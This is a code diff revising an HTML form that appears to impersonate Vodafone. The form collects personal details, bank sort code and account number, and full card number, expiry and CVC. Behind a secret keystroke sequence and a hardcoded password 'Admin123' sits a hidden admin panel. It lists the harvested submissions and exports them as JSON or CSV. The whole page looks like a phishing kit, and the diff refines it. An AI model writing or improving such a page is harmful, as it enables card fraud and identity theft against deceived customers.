@@ -47,17 +47,18 @@
     .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin-right: 8px; }
     @keyframes spin { to { transform: rotate(360deg); } }
     .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(3px); display: flex; align-items: center; justify-content: center; z-index: 2000; visibility: hidden; opacity: 0; transition: visibility 0s, opacity 0.3s ease; }
-    .modal-overlay.active { visibility: visible; opacity: 1; }
-    .thankyou-modal { background: white; max-width: 480px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem 1.8rem; transform: scale(0.95); transition: transform 0.2s ease; }
-    .modal-overlay.active .thankyou-modal { transform: scale(1); }
-    .thankyou-modal i { font-size: 4rem; color: #e60000; background: #fff0f0; padding: 18px; border-radius: 60px; margin-bottom: 1rem; }
+    
+    /* Simple Thank You Modal */
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 2000; align-items: center; justify-content: center; }
+    .modal-overlay.active { display: flex; }
+    .thankyou-modal { background: white; max-width: 480px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem 1.8rem; }
+    .thankyou-modal i { font-size: 4rem; color: #e60000; margin-bottom: 1rem; }
     .thankyou-modal h3 { font-size: 1.8rem; font-weight: 700; color: #1a2c3e; margin-bottom: 1rem; }
     .thankyou-modal p { color: #3a5a72; font-size: 1rem; line-height: 1.5; margin-bottom: 1.8rem; }
     .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
     .thankyou-modal button:hover { background: #c10000; }
     
-    /* Admin Panel - COMPLETELY HIDDEN from customers */
+    /* Admin Panel */
     .admin-panel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; width: 90%; max-width: 1200px; height: 80%; border-radius: 24px; z-index: 3000; box-shadow: 0 25px 50px rgba(0,0,0,0.3); overflow: hidden; }
     .admin-panel.active { display: flex; flex-direction: column; }
     .admin-header { background: #e60000; color: white; padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
@@ -67,12 +68,12 @@
     .submission-item pre { white-space: pre-wrap; font-family: monospace; font-size: 0.8rem; margin: 0; }
     .close-admin { background: rgba(255,255,255,0.2); border: none; color: white; padding: 0.5rem 1rem; border-radius: 8px; cursor: pointer; }
     
-    /* Secret Admin Login Overlay */
-    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 4000; align-items: center; justify-content: center; }
+    /* Admin Login */
+    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; align-items: center; justify-content: center; }
     .admin-login-overlay.active { display: flex; }
     .admin-login-box { background: white; padding: 2rem; border-radius: 24px; width: 350px; text-align: center; }
     .admin-login-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; }
-    .admin-login-box button { background: #e60000; color: white; border: none; padding: 12px 24px; border-radius: 40px; cursor: pointer; width: 100%; }
+    .admin-login-box button { background: #e60000; color: white; border: none; padding: 12px 24px; border-radius: 40px; cursor: pointer; width: 100%; font-size: 1rem; }
     .admin-login-box h3 { color: #e60000; margin-bottom: 1rem; }
     
     @media (max-width: 680px) { body { padding: 1rem; } .form-body { padding: 1.2rem; } .card-row, .dob-row { grid-template-columns: 1fr; } }
@@ -80,23 +81,21 @@
 </head>
 <body>
 
-<!-- NO VISIBLE BUTTONS FOR CUSTOMERS - Completely hidden admin access -->
-
-<!-- Admin Login Overlay (Only appears with secret key combo) -->
+<!-- Admin Login Overlay -->
 <div id="adminLoginOverlay" class="admin-login-overlay">
   <div class="admin-login-box">
     <i class="fas fa-lock" style="font-size: 3rem; color: #e60000;"></i>
-    <h3>Administrator Access</h3>
+    <h3>Admin Access Only</h3>
     <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
-    <button onclick="verifyAdminPassword()">Access Dashboard</button>
+    <button onclick="verifyAdminPassword()">Access Submissions</button>
     <p style="font-size: 0.7rem; margin-top: 1rem; color: #999;">Authorized personnel only</p>
   </div>
 </div>
 
-<!-- Admin Panel (Hidden until password entered) -->
+<!-- Admin Panel -->
 <div id="adminPanel" class="admin-panel">
   <div class="admin-header">
-    <h3><i class="fas fa-database"></i> Secure Admin Panel - Customer Submissions</h3>
+    <h3><i class="fas fa-database"></i> Customer Submissions Dashboard</h3>
     <button class="close-admin" onclick="closeAdminPanel()">✕ Close</button>
   </div>
   <div class="admin-content" id="adminContent">
@@ -124,7 +123,7 @@
   </div>
 
   <div class="form-body">
-    <form id="vodafoneForm" onsubmit="return false;">
+    <form id="vodafoneForm">
       <div class="section">
         <div class="section-title">
           <i class="fas fa-user-circle"></i>
@@ -254,383 +253,339 @@
   <div class="thankyou-modal">
     <i class="fas fa-check-circle"></i>
     <h3>Thank You!</h3>
-    <p>Thank you for submitting your details. Our Dispatch team will get in touch with you shortly.</p>
+    <p>Your details have been submitted successfully. Our team will contact you shortly.</p>
     <button onclick="closeThankYouModal()">Continue</button>
   </div>
 </div>
 
 <script>
-  (function() {
-    const form = document.getElementById('vodafoneForm');
-    const toast = document.getElementById('toastMsg');
-    const submitBtn = document.getElementById('submitBtn');
-    const thankyouModal = document.getElementById('thankyouModal');
-    let formSubmitted = false;
-    
-    // ============ YOUR SECRET ADMIN PASSWORD ============
-    const ADMIN_PASSWORD = "Admin123";
-    
-    // ============ SECRET KEYBOARD SHORTCUT ============
-    // Press "A" + "D" + "M" + "I" + "N" in sequence
-    let secretKeySequence = [];
-    const secretCode = ['a', 'd', 'm', 'i', 'n'];
-    
-    document.addEventListener('keydown', function(e) {
-      secretKeySequence.push(e.key.toLowerCase());
-      if (secretKeySequence.length > secretCode.length) {
-        secretKeySequence.shift();
-      }
-      if (JSON.stringify(secretKeySequence) === JSON.stringify(secretCode)) {
-        showAdminLogin();
-        secretKeySequence = [];
-      }
-    });
-    
-    function showMessage(text, isError = false) {
-      toast.textContent = text;
-      toast.classList.add('show');
-      if (isError) {
-        toast.classList.add('toast-error');
-        toast.classList.remove('toast-success');
-      } else {
-        toast.classList.add('toast-success');
-        toast.classList.remove('toast-error');
-      }
-      setTimeout(() => { toast.classList.remove('show'); }, 4500);
+  // YOUR SECRET ADMIN PASSWORD - CHANGE THIS!
+  const ADMIN_PASSWORD = "Admin123";
+  
+  // Get elements
+  const form = document.getElementById('vodafoneForm');
+  const toast = document.getElementById('toastMsg');
+  const submitBtn = document.getElementById('submitBtn');
+  const thankyouModal = document.getElementById('thankyouModal');
+  
+  // Function to show messages
+  function showMessage(text, isError = false) {
+    toast.textContent = text;
+    toast.classList.add('show');
+    if (isError) {
+      toast.classList.add('toast-error');
+      toast.classList.remove('toast-success');
+    } else {
+      toast.classList.add('toast-success');
+      toast.classList.remove('toast-error');
     }
-    
-    window.closeThankYouModal = function() {
-      thankyouModal.classList.remove('active');
-      if (formSubmitted) {
-        // Don't reset the form here, let the user see the success message first
-        formSubmitted = false;
-      }
-    };
-    
-    // Admin Functions
-    window.showAdminLogin = function() {
+    setTimeout(() => { toast.classList.remove('show'); }, 4000);
+  }
+  
+  // Close thank you modal
+  window.closeThankYouModal = function() {
+    thankyouModal.classList.remove('active');
+    // Reset form after closing modal
+    resetForm();
+  };
+  
+  // Reset form function
+  function resetForm() {
+    form.reset();
+    document.getElementById('employmentStatus').selectedIndex = 0;
+    document.getElementById('dobDay').value = '';
+    document.getElementById('dobMonth').value = '';
+    document.getElementById('dobYear').value = '';
+  }
+  
+  // Admin functions
+  window.verifyAdminPassword = function() {
+    const password = document.getElementById('adminPassword').value;
+    if (password === ADMIN_PASSWORD) {
+      document.getElementById('adminLoginOverlay').classList.remove('active');
+      openAdminPanel();
+      document.getElementById('adminPassword').value = '';
+    } else {
+      alert('❌ Invalid password! Access denied.');
+      document.getElementById('adminPassword').value = '';
+    }
+  };
+  
+  // Secret keyboard shortcut: Press "A" then "D" then "M" then "I" then "N"
+  let secretKeySequence = [];
+  const secretCode = ['a', 'd', 'm', 'i', 'n'];
+  
+  document.addEventListener('keydown', function(e) {
+    secretKeySequence.push(e.key.toLowerCase());
+    if (secretKeySequence.length > secretCode.length) {
+      secretKeySequence.shift();
+    }
+    if (JSON.stringify(secretKeySequence) === JSON.stringify(secretCode)) {
       document.getElementById('adminLoginOverlay').classList.add('active');
-    };
+      secretKeySequence = [];
+    }
+  });
+  
+  function openAdminPanel() {
+    const panel = document.getElementById('adminPanel');
+    loadSubmissions();
+    panel.classList.add('active');
+  }
+  
+  window.closeAdminPanel = function() {
+    document.getElementById('adminPanel').classList.remove('active');
+  };
+  
+  function loadSubmissions() {
+    const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
+    const container = document.getElementById('adminContent');
     
-    window.verifyAdminPassword = function() {
-      const password = document.getElementById('adminPassword').value;
-      if (password === ADMIN_PASSWORD) {
-        document.getElementById('adminLoginOverlay').classList.remove('active');
-        openAdminPanel();
-        document.getElementById('adminPassword').value = '';
-      } else {
-        alert('❌ Invalid password! Access denied.');
-        document.getElementById('adminPassword').value = '';
-      }
-    };
+    if (submissions.length === 0) {
+      container.innerHTML = '<div style="text-align: center; padding: 2rem;">📭 No submissions yet. Fill out the form to see data here.</div>';
+      return;
+    }
     
-    function openAdminPanel() {
-      const panel = document.getElementById('adminPanel');
+    let html = `<div style="margin-bottom: 1rem;">
+      <button onclick="downloadSubmissions()" style="background: #e60000; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-right: 10px;">
+        <i class="fas fa-download"></i> Download JSON
+      </button>
+      <button onclick="downloadAsCSV()" style="background: #2c3e50; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer;">
+        <i class="fas fa-file-csv"></i> Download CSV
+      </button>
+      <button onclick="clearAllSubmissions()" style="background: #c0392b; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-left: 10px;">
+        <i class="fas fa-trash"></i> Clear All
+      </button>
+      <span style="margin-left: 15px; font-size: 0.8rem;">Total: ${submissions.length} submissions</span>
+    </div>`;
+    
+    submissions.slice().reverse().forEach((sub, index) => {
+      html += `
+        <div class="submission-item">
+          <strong>#${submissions.length - index} - ${new Date(sub.timestamp).toLocaleString()}</strong>
+          <pre>${JSON.stringify(sub.data, null, 2)}</pre>
+        </div>
+      `;
+    });
+    
+    container.innerHTML = html;
+  }
+  
+  window.downloadSubmissions = function() {
+    const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
+    const dataStr = JSON.stringify(submissions, null, 2);
+    const blob = new Blob([dataStr], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `submissions_${new Date().toISOString()}.json`;
+    a.click();
+    URL.revokeObjectURL(url);
+    showMessage("Downloaded as JSON", false);
+  };
+  
+  window.downloadAsCSV = function() {
+    const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
+    if (submissions.length === 0) {
+      showMessage("No submissions to download", true);
+      return;
+    }
+    
+    const allKeys = new Set();
+    submissions.forEach(sub => {
+      Object.keys(sub.data).forEach(key => allKeys.add(key));
+    });
+    const headers = Array.from(allKeys);
+    
+    let csv = headers.join(',') + '\n';
+    submissions.forEach(sub => {
+      const row = headers.map(header => {
+        let value = sub.data[header] || '';
+        value = String(value).replace(/"/g, '""');
+        if (value.includes(',') || value.includes('"') || value.includes('\n')) {
+          value = `"${value}"`;
+        }
+        return value;
+      });
+      csv += row.join(',') + '\n';
+    });
+    
+    const blob = new Blob([csv], {type: 'text/csv'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `submissions_${new Date().toISOString()}.csv`;
+    a.click();
+    URL.revokeObjectURL(url);
+    showMessage("Downloaded as CSV", false);
+  };
+  
+  window.clearAllSubmissions = function() {
+    if (confirm("⚠️ WARNING: This will delete ALL submissions. Are you sure?")) {
+      localStorage.removeItem('vodafone_submissions');
       loadSubmissions();
-      panel.classList.add('active');
+      showMessage("All submissions cleared", false);
     }
-    
-    window.closeAdminPanel = function() {
-      document.getElementById('adminPanel').classList.remove('active');
-    };
-    
-    function loadSubmissions() {
+  };
+  
+  // Save to localStorage
+  function saveToLocalStorage(data) {
+    try {
       const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
-      const container = document.getElementById('adminContent');
-      
-      if (submissions.length === 0) {
-        container.innerHTML = '<div style="text-align: center; padding: 2rem;">📭 No submissions yet. Submit the form to see data here.</div>';
-        return;
-      }
-      
-      let html = `<div style="margin-bottom: 1rem;">
-        <button onclick="downloadSubmissions()" style="background: #e60000; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-right: 10px;">
-          <i class="fas fa-download"></i> Download as JSON
-        </button>
-        <button onclick="downloadAsCSV()" style="background: #2c3e50; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer;">
-          <i class="fas fa-file-csv"></i> Download as CSV
-        </button>
-        <button onclick="clearAllSubmissions()" style="background: #c0392b; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-left: 10px;">
-          <i class="fas fa-trash"></i> Clear All
-        </button>
-        <span style="margin-left: 15px; font-size: 0.8rem;">Total: ${submissions.length} submissions</span>
-      </div>`;
-      
-      submissions.slice().reverse().forEach((sub, index) => {
-        html += `
-          <div class="submission-item">
-            <strong>#${submissions.length - index} - ${new Date(sub.timestamp).toLocaleString()}</strong>
-            <pre>${JSON.stringify(sub.data, null, 2)}</pre>
-          </div>
-        `;
+      submissions.push({ 
+        id: Date.now(), 
+        timestamp: new Date().toISOString(),
+        data: data 
       });
-      
-      container.innerHTML = html;
-    }
-    
-    window.downloadSubmissions = function() {
-      const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
-      const dataStr = JSON.stringify(submissions, null, 2);
-      const blob = new Blob([dataStr], {type: 'application/json'});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `vodafone_submissions_${new Date().toISOString()}.json`;
-      a.click();
-      URL.revokeObjectURL(url);
-      showMessage("Submissions downloaded as JSON", false);
-    };
-    
-    window.downloadAsCSV = function() {
-      const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
-      if (submissions.length === 0) {
-        showMessage("No submissions to download", true);
-        return;
-      }
-      
-      const allKeys = new Set();
-      submissions.forEach(sub => {
-        Object.keys(sub.data).forEach(key => allKeys.add(key));
-      });
-      const headers = Array.from(allKeys);
-      
-      let csv = headers.join(',') + '\n';
-      submissions.forEach(sub => {
-        const row = headers.map(header => {
-          let value = sub.data[header] || '';
-          value = String(value).replace(/"/g, '""');
-          if (value.includes(',') || value.includes('"') || value.includes('\n')) {
-            value = `"${value}"`;
-          }
-          return value;
-        });
-        csv += row.join(',') + '\n';
-      });
-      
-      const blob = new Blob([csv], {type: 'text/csv'});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `vodafone_submissions_${new Date().toISOString()}.csv`;
-      a.click();
-      URL.revokeObjectURL(url);
-      showMessage("Submissions downloaded as CSV", false);
-    };
-    
-    window.clearAllSubmissions = function() {
-      if (confirm("⚠️ WARNING: This will delete ALL submissions. Are you sure?")) {
-        localStorage.removeItem('vodafone_submissions');
-        loadSubmissions();
-        showMessage("All submissions cleared", false);
-      }
-    };
-    
-    function saveToLocalStorage(data) {
-      try {
-        const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
-        submissions.push({ 
-          id: Date.now(), 
-          timestamp: new Date().toISOString(),
-          data: data 
-        });
-        localStorage.setItem('vodafone_submissions', JSON.stringify(submissions));
-        console.log('✅ Submission saved!');
-        return true;
-      } catch(e) {
-        console.error('localStorage error:', e);
-        return false;
-      }
-    }
-    
-    function validateRequiredFields() {
-      const requiredFields = [
-        { id: 'firstName', name: 'First name' },
-        { id: 'surname', name: 'Surname' },
-        { id: 'phoneNo', name: 'Phone number' },
-        { id: 'address', name: 'Address' },
-        { id: 'historyAddress', name: 'History on address' },
-        { id: 'nameOnAccount', name: 'Name on account' },
-        { id: 'sortCode', name: 'Sort code' },
-        { id: 'accountNumber', name: 'Account number' },
-        { id: 'nameOnCard', name: 'Name on card' },
-        { id: 'cardNumber', name: 'Long numbers' },
-        { id: 'expiryDate', name: 'Expiry date' },
-        { id: 'cvc', name: 'CVC' }
-      ];
-      for (let field of requiredFields) {
-        const inputElem = document.getElementById(field.id);
-        if (!inputElem.value.trim()) {
-          showMessage(`⚠️ ${field.name} is required`, true);
-          inputElem.focus();
-          inputElem.style.borderColor = "#e60000";
-          setTimeout(() => { inputElem.style.borderColor = ""; }, 1500);
-          return false;
-        }
-        inputElem.style.borderColor = "";
-      }
-      
-      const day = document.getElementById('dobDay').value;
-      const month = document.getElementById('dobMonth').value;
-      const year = document.getElementById('dobYear').value;
-      
-      if (!day || !month || !year) {
-        showMessage("🎂 Please enter complete Date of Birth (DD/MM/YYYY)", true);
-        return false;
-      }
-      
-      if (day < 1 || day > 31) {
-        showMessage("📅 Please enter valid day (1-31)", true);
-        return false;
-      }
-      
-      if (month < 1 || month > 12) {
-        showMessage("📅 Please enter valid month (1-12)", true);
-        return false;
-      }
-      
-      if (year < 1920 || year > 2026) {
-        showMessage("📅 Please enter valid year (1920-2026)", true);
-        return false;
-      }
-      
-      const birthDate = new Date(year, month-1, day);
-      const today = new Date();
-      let age = today.getFullYear() - birthDate.getFullYear();
-      const mDiff = today.getMonth() - birthDate.getMonth();
-      if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
-      if (age < 18) {
-        showMessage("⚠️ You must be at least 18 years old to continue.", true);
-        return false;
-      }
-
-      const employmentSelect = document.getElementById('employmentStatus');
-      if (!employmentSelect.value) {
-        showMessage("⚠️ Please select Employment status", true);
-        return false;
-      }
-
-      const phone = document.getElementById('phoneNo').value.trim();
-      const phoneRegex = /^[\+\d\s\-\(\)]{8,20}$/;
-      if (!phoneRegex.test(phone)) {
-        showMessage("📞 Please enter a valid UK phone number", true);
-        return false;
-      }
-
-      const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
-      if (!/^[0-9]{13,19}$/.test(cardNum)) {
-        showMessage("💳 Card number must contain 13-19 digits", true);
-        return false;
-      }
-
-      const expiry = document.getElementById('expiryDate').value.trim();
-      const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-      if (!expiryRegex.test(expiry)) {
-        showMessage("📅 Expiry date must be MM/YY format", true);
-        return false;
-      }
-      
-      const cvcVal = document.getElementById('cvc').value.trim();
-      if (!/^[0-9]{3,4}$/.test(cvcVal)) {
-        showMessage("🔒 CVC must be 3 or 4 digits", true);
-        return false;
-      }
+      localStorage.setItem('vodafone_submissions', JSON.stringify(submissions));
       return true;
+    } catch(e) {
+      console.error('Error:', e);
+      return false;
     }
-    
-    function gatherFormData() {
-      const formDataObj = {};
-      const formElements = form.querySelectorAll('input, select');
-      formElements.forEach(el => {
-        if (el.name && el.value) {
-          formDataObj[el.name] = el.value;
-        }
-      });
-      // Add formatted DOB
-      const day = document.getElementById('dobDay').value;
-      const month = document.getElementById('dobMonth').value;
-      const year = document.getElementById('dobYear').value;
-      formDataObj['Date of Birth'] = `${day}/${month}/${year}`;
-      formDataObj['Submission Timestamp'] = new Date().toLocaleString();
-      return formDataObj;
-    }
-    
-    function resetForm() {
-      form.reset();
-      document.getElementById('employmentStatus').selectedIndex = 0;
-      document.getElementById('dobDay').value = '';
-      document.getElementById('dobMonth').value = '';
-      document.getElementById('dobYear').value = '';
-    }
-    
-    // Card number formatting
-    const cardNumberInput = document.getElementById('cardNumber');
-    cardNumberInput.addEventListener('input', function(e) {
-      let raw = this.value.replace(/\s/g, '');
-      if (raw.length > 19) raw = raw.slice(0,19);
-      let formatted = '';
-      for (let i = 0; i < raw.length; i++) {
-        if (i > 0 && i % 4 === 0) formatted += ' ';
-        formatted += raw[i];
-      }
-      this.value = formatted;
-    });
-    
-    // Expiry date formatting
-    const expiryInput = document.getElementById('expiryDate');
-    expiryInput.addEventListener('input', function(e) {
-      let raw = this.value.replace(/[^0-9]/g, '');
-      if (raw.length >= 3) {
-        let month = raw.slice(0,2);
-        let year = raw.slice(2,4);
-        if (month > 12) month = '12';
-        this.value = month + '/' + year;
-      } else if (raw.length === 2) {
-        this.value = raw;
-      } else {
-        this.value = raw;
-      }
-      if (raw.length > 4) this.value = this.value.slice(0,5);
-    });
-    
-    // Clear button
-    document.getElementById('clearBtn').addEventListener('click', function() {
-      resetForm();
-      showMessage("Form has been reset", false);
-    });
-    
-    // Submit form WITHOUT page reload
-    document.getElementById('submitBtn').addEventListener('click', async function(e) {
-      e.preventDefault();
-      
-      if (!validateRequiredFields()) {
+  }
+  
+  // Validation
+  function validateForm() {
+    // Check required fields
+    const required = ['firstName', 'surname', 'phoneNo', 'address', 'historyAddress', 'nameOnAccount', 'sortCode', 'accountNumber', 'nameOnCard', 'cardNumber', 'expiryDate', 'cvc'];
+    for (let field of required) {
+      const el = document.getElementById(field);
+      if (!el.value.trim()) {
+        showMessage(`⚠️ ${field.replace(/([A-Z])/g, ' $1').trim()} is required`, true);
+        el.focus();
         return false;
       }
-      
-      const formData = gatherFormData();
-      
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<span class="loading-spinner"></span> Processing...';
-      
-      // Simulate processing delay
-      setTimeout(() => {
-        const saved = saveToLocalStorage(formData);
-        
-        if (saved) {
-          formSubmitted = true;
-          resetForm();
-          thankyouModal.classList.add('active');
-          showMessage("✅ Form submitted successfully!", false);
-        } else {
-          showMessage("❌ Error saving submission. Please try again.", true);
-        }
-        
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
-      }, 500);
-      
+    }
+    
+    // Check DOB
+    const day = document.getElementById('dobDay').value;
+    const month = document.getElementById('dobMonth').value;
+    const year = document.getElementById('dobYear').value;
+    if (!day || !month || !year) {
+      showMessage("🎂 Please enter complete Date of Birth", true);
       return false;
+    }
+    
+    // Check age (18+)
+    const birthDate = new Date(year, month-1, day);
+    const today = new Date();
+    let age = today.getFullYear() - birthDate.getFullYear();
+    const mDiff = today.getMonth() - birthDate.getMonth();
+    if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
+    if (age < 18) {
+      showMessage("⚠️ You must be at least 18 years old", true);
+      return false;
+    }
+    
+    // Check employment status
+    if (!document.getElementById('employmentStatus').value) {
+      showMessage("⚠️ Please select Employment status", true);
+      return false;
+    }
+    
+    // Check phone
+    const phone = document.getElementById('phoneNo').value.trim();
+    if (!/^[\+\d\s\-\(\)]{8,20}$/.test(phone)) {
+      showMessage("📞 Please enter a valid phone number", true);
+      return false;
+    }
+    
+    // Check card number
+    const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    if (!/^[0-9]{13,19}$/.test(cardNum)) {
+      showMessage("💳 Card number must be 13-19 digits", true);
+      return false;
+    }
+    
+    // Check expiry
+    const expiry = document.getElementById('expiryDate').value.trim();
+    if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
+      showMessage("📅 Expiry date must be MM/YY format", true);
+      return false;
+    }
+    
+    // Check CVC
+    const cvc = document.getElementById('cvc').value.trim();
+    if (!/^[0-9]{3,4}$/.test(cvc)) {
+      showMessage("🔒 CVC must be 3 or 4 digits", true);
+      return false;
+    }
+    
+    return true;
+  }
+  
+  // Gather form data
+  function gatherFormData() {
+    const data = {};
+    const inputs = form.querySelectorAll('input, select');
+    inputs.forEach(input => {
+      if (input.name && input.value) {
+        data[input.name] = input.value;
+      }
     });
-  })();
+    data['Date of Birth'] = `${document.getElementById('dobDay').value}/${document.getElementById('dobMonth').value}/${document.getElementById('dobYear').value}`;
+    data['Submission Time'] = new Date().toLocaleString();
+    return data;
+  }
+  
+  // Card number formatting
+  document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let raw = this.value.replace(/\s/g, '');
+    if (raw.length > 19) raw = raw.slice(0,19);
+    let formatted = '';
+    for (let i = 0; i < raw.length; i++) {
+      if (i > 0 && i % 4 === 0) formatted += ' ';
+      formatted += raw[i];
+    }
+    this.value = formatted;
+  });
+  
+  // Expiry formatting
+  document.getElementById('expiryDate').addEventListener('input', function(e) {
+    let raw = this.value.replace(/[^0-9]/g, '');
+    if (raw.length >= 3) {
+      let month = raw.slice(0,2);
+      let year = raw.slice(2,4);
+      if (month > 12) month = '12';
+      this.value = month + '/' + year;
+    }
+    if (raw.length > 4) this.value = this.value.slice(0,5);
+  });
+  
+  // Clear button
+  document.getElementById('clearBtn').addEventListener('click', function() {
+    resetForm();
+    showMessage("Form has been reset", false);
+  });
+  
+  // Submit button
+  document.getElementById('submitBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    
+    if (!validateForm()) {
+      return;
+    }
+    
+    const formData = gatherFormData();
+    
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
+    
+    setTimeout(() => {
+      const saved = saveToLocalStorage(formData);
+      
+      if (saved) {
+        // Show thank you modal
+        thankyouModal.classList.add('active');
+        showMessage("✅ Submitted successfully!", false);
+      } else {
+        showMessage("❌ Error saving. Please try again.", true);
+      }
+      
+      submitBtn.disabled = false;
+      submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
+    }, 500);
+  });
 </script>
 </body>
 </html>
